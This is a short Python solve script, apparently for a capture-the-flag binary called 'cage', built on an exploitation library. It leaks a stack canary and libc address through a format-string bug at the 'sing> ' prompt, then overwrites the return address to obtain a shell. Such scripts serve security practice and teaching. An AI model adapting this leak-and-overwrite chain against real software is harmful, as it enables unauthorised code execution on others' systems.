from pwnx import Challenge


x = Challenge(
    "./cage",
    libc="./libc.so.6",
    loader="./ld-linux-x86-64.so.2",
)

leaks = x.format_leak(
    x.input.line(b"sing> "),
    canary=9,
    libc=11,
    prefix=b"The canary tilts its head: ",
    separator=b"|",
)

x.relate(x.libc.base, leaks.libc - 0x29CA8)

control = x.control(
    x.input.line(b"sing> ").return_address(
        at=40,
        canary=(24, leaks.canary),
    )
)

x.want(x.shell(), via=control)
x.run(attempts=64)
